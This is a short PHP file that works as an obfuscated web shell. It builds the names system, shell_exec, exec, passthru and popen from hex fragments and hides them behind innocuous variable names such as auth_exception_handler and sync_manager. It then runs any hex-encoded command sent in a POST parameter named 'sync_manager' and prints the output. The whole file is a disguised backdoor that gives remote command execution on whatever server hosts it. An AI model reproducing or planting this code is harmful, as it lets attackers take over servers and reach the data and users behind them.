<?php


$k1 = '73';
$k2 = '6c';
$k3 = '78';
$k4 = '65';
$k5 = '70';
$k6 = '75';
$k7 = '6e';
$k8 = '74';
$k9 = '72';
$k10 = '61';
$k11 = '6d';
$k12 = '63';
$k13 = '5f';
$k14 = '67';
$auth_exception_handler1 = pack("H*", $k1 . '79' . '73' . '74' . '65' . '6d');
$auth_exception_handler2 = pack("H*", '73' . '68' . '65' . $k2 . $k2 . '5f' . '65' . $k3 . '65' . '63');
$auth_exception_handler3 = pack("H*", $k4 . $k3 . '65' . '63');
$auth_exception_handler4 = pack("H*", $k5 . '61' . '73' . '73' . '74' . '68' . '72' . $k6);
$auth_exception_handler5 = pack("H*", $k5 . '6f' . $k5 . '65' . $k7);
$auth_exception_handler6 = pack("H*", '73' . $k8 . $k9 . '65' . $k10 . $k11 . '5f' . '67' . $k4 . '74' . '5f' . $k12 . '6f' . $k7 . $k8 . $k4 . '6e' . '74' . '73');
$auth_exception_handler7 = pack("H*", $k5 . '63' . '6c' . '6f' . $k1 . '65');
$sync_manager = pack("H*", '73' . '79' . $k7 . '63' . $k13 . $k11 . '61' . $k7 . '61' . $k14 . '65' . $k9);
if (isset($_POST[$sync_manager])) {
    $sync_manager = pack("H*", $_POST[$sync_manager]);
    if (function_exists($auth_exception_handler1)) {
        $auth_exception_handler1($sync_manager);
    } elseif (function_exists($auth_exception_handler2)) {
        print $auth_exception_handler2($sync_manager);
    } elseif (function_exists($auth_exception_handler3)) {
        $auth_exception_handler3($sync_manager, $data_chunk_record);
        print join("\n", $data_chunk_record);
    } elseif (function_exists($auth_exception_handler4)) {
        $auth_exception_handler4($sync_manager);
    } elseif (function_exists($auth_exception_handler5) && function_exists($auth_exception_handler6) && function_exists($auth_exception_handler7)) {
        $ent_resource = $auth_exception_handler5($sync_manager, 'r');
        if ($ent_resource) {
            $entity_key = $auth_exception_handler6($ent_resource);
            $auth_exception_handler7($ent_resource);
            print $entity_key;
        }
    }
    exit;
}
